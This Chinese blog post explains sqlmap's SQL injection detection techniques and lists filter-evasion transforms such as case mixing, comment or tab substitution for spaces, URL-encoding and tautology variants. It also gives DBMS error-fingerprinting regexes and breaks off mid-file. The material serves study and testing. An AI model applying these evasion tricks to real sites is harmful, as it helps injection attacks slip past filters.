<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>sqlmap 中的 SQL Injection 检测技术 | 安全代码</title><meta name="author" content="曼福吉"><meta name="copyright" content="曼福吉"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="https:&#x2F;&#x2F;github.com&#x2F;henices&#x2F;sqlihttps:&#x2F;&#x2F;www.owasp.org&#x2F;index.php&#x2F;Testing_for_SQL_Injection_(OWASP-DV-005) 基于信道的 sql injection 分类InbandSQL代码注入和SQL injection 结果的获取在同一频道(e.g. 浏览器), 获得的数据直接显示在应用程序页面的正常输出或者错">
<meta property="og:type" content="article">
<meta property="og:title" content="sqlmap 中的 SQL Injection 检测技术">
<meta property="og:url" content="https://usmacd.com/cn/sqlmap_sql_injection/index.html">
<meta property="og:site_name" content="安全代码">
<meta property="og:description" content="https:&#x2F;&#x2F;github.com&#x2F;henices&#x2F;sqlihttps:&#x2F;&#x2F;www.owasp.org&#x2F;index.php&#x2F;Testing_for_SQL_Injection_(OWASP-DV-005) 基于信道的 sql injection 分类InbandSQL代码注入和SQL injection 结果的获取在同一频道(e.g. 浏览器), 获得的数据直接显示在应用程序页面的正常输出或者错">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640">
<meta property="article:published_time" content="2017-07-06T16:00:00.000Z">
<meta property="article:modified_time" content="2017-07-06T16:00:00.000Z">
<meta property="article:author" content="曼福吉">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "sqlmap 中的 SQL Injection 检测技术",
  "url": "https://usmacd.com/cn/sqlmap_sql_injection/",
  "image": "https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640",
  "datePublished": "2017-07-06T16:00:00.000Z",
  "dateModified": "2017-07-06T16:00:00.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "曼福吉",
      "url": "https://usmacd.com"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://usmacd.com/cn/sqlmap_sql_injection/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'sqlmap 中的 SQL Injection 检测技术',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/self/atom-one-light.css"><link rel="stylesheet" href="/self/nord.css"><meta name="generator" content="Hexo 8.1.1"><link rel="alternate" href="/atom.xml" title="安全代码" type="application/atom+xml">
<link rel="alternate" href="/rss.xml" title="安全代码" type="application/rss+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">173</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/thoughts"><i class="fa-fw fas fa-cloud"></i><span> 想法</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/sitemap.xml"><span> sitemap</span></a></div><div class="menus_item"><a class="site-page" href="/random.html"><span> random</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">安全代码</span></a><a class="nav-page-title" href="/"><span class="site-name">sqlmap 中的 SQL Injection 检测技术</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/thoughts"><i class="fa-fw fas fa-cloud"></i><span> 想法</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/sitemap.xml"><span> sitemap</span></a></div><div class="menus_item"><a class="site-page" href="/random.html"><span> random</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">sqlmap 中的 SQL Injection 检测技术</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2017-07-06T16:00:00.000Z" title="发表于 2017-07-07 00:00:00">2017-07-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2017-07-06T16:00:00.000Z" title="更新于 2017-07-07 00:00:00">2017-07-07</time></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><a target="_blank" rel="noopener" href="https://github.com/henices/sqli">https://github.com/henices/sqli</a><br><a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OWASP-DV-005)">https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OWASP-DV-005)</a></p>
<h2 id="基于信道的-sql-injection-分类"><a href="#基于信道的-sql-injection-分类" class="headerlink" title="基于信道的 sql injection 分类"></a>基于信道的 sql injection 分类</h2><h3 id="Inband"><a href="#Inband" class="headerlink" title="Inband"></a>Inband</h3><p>SQL代码注入和SQL injection 结果的获取在同一频道(e.g. 浏览器), 获得的数据直接显示在应用程序页面的正常输出或者错误信息中,这是最简单的攻击类型。</p>
<h3 id="Out-of-band"><a href="#Out-of-band" class="headerlink" title="Out-of-band"></a>Out-of-band</h3><p>SQL查询数据的传输使用不同的频道(e.g HTTP，DNS)， 这是从数据库中获取大量数据简单的方法。</p>
<h3 id="Inferential"><a href="#Inferential" class="headerlink" title="Inferential"></a>Inferential</h3><p>没用真实有用的数据传输，但是攻击者可以通过发送特定的请求，观察数据库服务器的返回的结果的行为重建信息。</p>
<h2 id="基于-sql-inject-检测技术的分类"><a href="#基于-sql-inject-检测技术的分类" class="headerlink" title="基于 sql inject 检测技术的分类"></a>基于 sql inject 检测技术的分类</h2><h3 id="boolean-based-blind-SQL-injection"><a href="#boolean-based-blind-SQL-injection" class="headerlink" title="boolean-based blind SQL injection"></a>boolean-based blind SQL injection</h3><p>也被称为推理SQL注入：SqlMap替换或追加HTTP请求中受影响的参数，一个有效的SQL语句字符串包含 SELECT 子语句，或任何其他用户要检索输出的SQL语句。对于每个HTTP响应，将其 headers&#x2F;body和原始请求的做比较，该工具一个字符一个字符地分析的注入语句的输出。另外，用户可以提供一个字符串或正则表达式匹配正确的页面。使用SqlMap实现的二分算法来实施执行此技术可以获取七个最大的每个HTTP请求的输出的每一个字符。凡不属于输出纯文本纯字符集，SqlMap将适应与更大范围的算法来检测输出。</p>
<h3 id="error-based-SQL-injection"><a href="#error-based-SQL-injection" class="headerlink" title="error-based SQL injection"></a>error-based SQL injection</h3><p>sqlmap替换或者追加受影响的HTTP参数一个特定数据的语法错误的SQL语句，分析HTTP 响应header和body，查询DBMS错误信息中是否包含注入的预先定义的字符串链，并且SQL语句的输出在字符串链的中间.这种技术仅在web应用程序被配置成泄漏后端数据库管理系统错误信息时有效。</p>
<h3 id="time-based-blind-or-stacked-queries"><a href="#time-based-blind-or-stacked-queries" class="headerlink" title="time-based blind or stacked queries"></a>time-based blind or stacked queries</h3><p>也被称为全盲SQL注入：SqlMap替换或追加HTTP请求中受影响的参数，构造一个有效的SQL语句字符串包含一个查询，使后端DBMS sleep几秒钟。对于每个HTTP响应，比较其响应时间与原始请求的HTTP响应时间，该工具一个字符一个字符地分析的注入语句的输出。和boolean-based技术一样，同样应用了二分算法(bisection algorithm)。</p>
<h3 id="UNION-query-SQL-injection"><a href="#UNION-query-SQL-injection" class="headerlink" title="UNION query SQL injection"></a>UNION query SQL injection</h3><p>SqlMap 追加受影响的参数一个以UNION ALL SELECT开始的有效的SQL语句字符串。这种技术当Web应用程序页面内将SELECT语句的同一周期输出，或者类似的，网页上的内容中显示查询结果的每一行时有效。SqlMap是还可以利用部分UNION 查询的SQL注入漏洞，当SQL语句的输出不是在一个周期内的，在构造的区域内只有在查询输出的第一项被显示。</p>
<h3 id="Stacked-queries-SQL-injection"><a href="#Stacked-queries-SQL-injection" class="headerlink" title="Stacked queries SQL injection"></a>Stacked queries SQL injection</h3><p>也被称为多语句SQL注入（multiple statements SQL injection）：SqlMap 测试 Web 应用程序是否支持批量叠查询, 然后，它支持的情况下，它附加到HTTP请求中受影响的参数，一个分号（;） 随后的SQL语句会被执行。这种技术在执行 SELECT以外的SQL语句时非常有用，根据后端数据库管理系统的不同用户和会话特权,数据定义和数据操作SQL语句可能导致文件系统的读写访问和操作系统命令执行的。</p>
<h2 id="SQL-Injection-检测的逃逸技术"><a href="#SQL-Injection-检测的逃逸技术" class="headerlink" title="SQL Injection 检测的逃逸技术"></a>SQL Injection 检测的逃逸技术</h2><h3 id="随机大小写"><a href="#随机大小写" class="headerlink" title="随机大小写"></a>随机大小写</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">INSERT =&gt; InsERt<br></code></pre></td></tr></table></figure>

<p>支持的数据库类型：</p>
<table>
<thead>
<tr>
<th>数据库</th>
<th>是否支持</th>
</tr>
</thead>
<tbody><tr>
<td>MSSQL</td>
<td>支持</td>
</tr>
<tr>
<td>MySQL</td>
<td>支持</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>支持</td>
</tr>
<tr>
<td>Oracle</td>
<td>支持</td>
</tr>
</tbody></table>
<h3 id="空格用注释替换"><a href="#空格用注释替换" class="headerlink" title="空格用注释替换"></a>空格用注释替换</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> id <span class="hljs-keyword">FROM</span> users <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">SELECT</span><span class="hljs-comment">/**/</span>id<span class="hljs-comment">/**/</span><span class="hljs-keyword">FROM</span><span class="hljs-comment">/**/</span>users<br></code></pre></td></tr></table></figure>

<p>支持的数据库类型：</p>
<table>
<thead>
<tr>
<th>数据库</th>
<th>是否支持</th>
</tr>
</thead>
<tbody><tr>
<td>MSSQL</td>
<td>支持</td>
</tr>
<tr>
<td>MySQL</td>
<td>支持</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>支持</td>
</tr>
<tr>
<td>Oracle</td>
<td>支持</td>
</tr>
<tr>
<td>Access</td>
<td>不支持</td>
</tr>
</tbody></table>
<p>Oracle 10g 测试</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-operator">*</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span> v$version;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">BANNER<br>----------------------------------------------------------------<br>Oracle Database 10g Enterprise Edition Release 10.1.0.3.0 - Prod<br>PL/SQL Release 10.1.0.3.0 - Production<br>CORE	10.1.0.3.0	Production<br>TNS for Linux: Version 10.1.0.3.0 - Production<br>NLSRTL Version 10.1.0.3.0 - Production<br></code></pre></td></tr></table></figure>

<p>PostgreSQL:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">postgres<span class="hljs-operator">=</span># <span class="hljs-keyword">select</span><span class="hljs-comment">/*abc*/</span>version();<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">                                                               version                                                                <br>--------------------------------------------------------------------------------------------------------------------<br> PostgreSQL 8.1.4 on i686-pc-linux-gnu, compiled by GCC i686-pc-linux-gnu-gcc (GCC) 3.4.6 (Gentoo 3.4.6-r1, ssp-3.4.5-1.0, pie-8.7.9)<br></code></pre></td></tr></table></figure>

<h3 id="随机注释"><a href="#随机注释" class="headerlink" title="随机注释"></a>随机注释</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">IN</span><span class="hljs-comment">/**/</span>S<span class="hljs-comment">/**/</span>ERT<br></code></pre></td></tr></table></figure>

<p>本身语法不支持，但可以对付不正确的过滤.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">postgres<span class="hljs-operator">=</span># selec<span class="hljs-comment">/**/</span>t version();<br></code></pre></td></tr></table></figure>

<p>ERROR:  syntax error at or near “selec” 在字符 1<br>第 1 行: selec&#x2F;**&#x2F;t version();</p>
<p>Oracle:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><span class="hljs-operator">&gt;</span> sel<span class="hljs-comment">/**/</span>ect v$version;<br></code></pre></td></tr></table></figure>

<p>SP2-0734: unknown command beginning “sel&#x2F;**&#x2F;ect…” - rest of line ignored.</p>
<h3 id="空格用-替换"><a href="#空格用-替换" class="headerlink" title="空格用+替换"></a>空格用+替换</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> id <span class="hljs-keyword">FROM</span> users <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">SELECT</span><span class="hljs-operator">+</span>id<span class="hljs-operator">+</span><span class="hljs-keyword">FROM</span><span class="hljs-operator">+</span>users<br></code></pre></td></tr></table></figure>

<h3 id="随机空格替换"><a href="#随机空格替换" class="headerlink" title="随机空格替换"></a>随机空格替换</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> id <span class="hljs-keyword">FROM</span> users <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">SELECT</span>\rid\tFROM\nusers<br></code></pre></td></tr></table></figure>


<table>
<thead>
<tr>
<th>数据库</th>
<th>是否支持</th>
</tr>
</thead>
<tbody><tr>
<td>MSSQL</td>
<td>支持</td>
</tr>
<tr>
<td>Mysql</td>
<td>支持</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>支持</td>
</tr>
<tr>
<td>Oracle</td>
<td>支持</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$echo -e &quot;select\t*from\tv\$version;&quot;| sqlplus &quot;/ as sysdba&quot;<br><br>SQL&gt; <br>BANNER<br>----------------------------------------------------------------<br>Oracle Database 10g Enterprise Edition Release 10.1.0.3.0 - Prod<br>PL/SQL Release 10.1.0.3.0 - Production<br>CORE	10.1.0.3.0	Production<br>TNS for Linux: Version 10.1.0.3.0 - Production<br>NLSRTL Version 10.1.0.3.0 - Production<br></code></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">echo -e &quot;select\tversion();&quot; | psql -U postgres<br>                                                               version                                                                <br>--------------------------------------------------------------------------------------------------------------------------------------<br> PostgreSQL 8.1.4 on i686-pc-linux-gnu, compiled by GCC i686-pc-linux-gnu-gcc (GCC) 3.4.6 (Gentoo 3.4.6-r1, ssp-3.4.5-1.0, pie-8.7.9)<br></code></pre></td></tr></table></figure>


<h3 id="urlencode"><a href="#urlencode" class="headerlink" title="urlencode"></a>urlencode</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> FIELD <span class="hljs-keyword">FROM</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">TABLE</span><span class="hljs-string">&#x27; =&gt; &#x27;</span><span class="hljs-operator">%</span><span class="hljs-number">53</span><span class="hljs-operator">%</span><span class="hljs-number">45</span><span class="hljs-operator">%</span><span class="hljs-number">4</span>c<span class="hljs-operator">%</span><span class="hljs-number">45</span><span class="hljs-operator">%</span><span class="hljs-number">43</span><span class="hljs-operator">%</span><span class="hljs-number">54</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">%</span><span class="hljs-number">46</span><span class="hljs-operator">%</span><span class="hljs-number">49</span><span class="hljs-operator">%</span><span class="hljs-number">45</span><span class="hljs-operator">%</span><span class="hljs-number">4</span>c<span class="hljs-operator">%</span><span class="hljs-number">44</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">%</span><span class="hljs-number">46</span><span class="hljs-operator">%</span><span class="hljs-number">52</span><span class="hljs-operator">%</span><span class="hljs-number">4</span>f<span class="hljs-operator">%</span><span class="hljs-number">4</span>d<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">%</span><span class="hljs-number">54</span><span class="hljs-operator">%</span><span class="hljs-number">41</span><span class="hljs-operator">%</span><span class="hljs-number">42</span><span class="hljs-operator">%</span><span class="hljs-number">4</span>c<span class="hljs-operator">%</span><span class="hljs-number">45</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>

<h3 id="between-替换"><a href="#between-替换" class="headerlink" title="between 替换"></a>between 替换</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">A <span class="hljs-operator">&gt;</span> B<span class="hljs-string">&#x27; =&gt; &#x27;</span>A <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">BETWEEN</span> <span class="hljs-number">0</span> <span class="hljs-keyword">AND</span> B<br></code></pre></td></tr></table></figure>

<h3 id="逃避正则表达式检测"><a href="#逃避正则表达式检测" class="headerlink" title="逃避正则表达式检测"></a>逃避正则表达式检测</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>  使用  <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;a&#x27;</span><br></code></pre></td></tr></table></figure>

<h2 id="DBMS分析技术"><a href="#DBMS分析技术" class="headerlink" title="DBMS分析技术"></a>DBMS分析技术</h2><h3 id="通过错误信息分析DBMS"><a href="#通过错误信息分析DBMS" class="headerlink" title="通过错误信息分析DBMS"></a>通过错误信息分析DBMS</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- MySQL --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;MySQL&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;SQL syntax.*MySQL&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*mysql_.*&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;valid MySQL result&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;MySqlClient\.&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- PostgreSQL --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;PostgreSQL&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;PostgreSQL.*ERROR&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*\Wpg_.*&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;valid PostgreSQL result&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Npgsql\.&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Microsoft SQL Server --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Microsoft SQL Server&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Driver.* SQL[\-\_\ ]*Server&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> 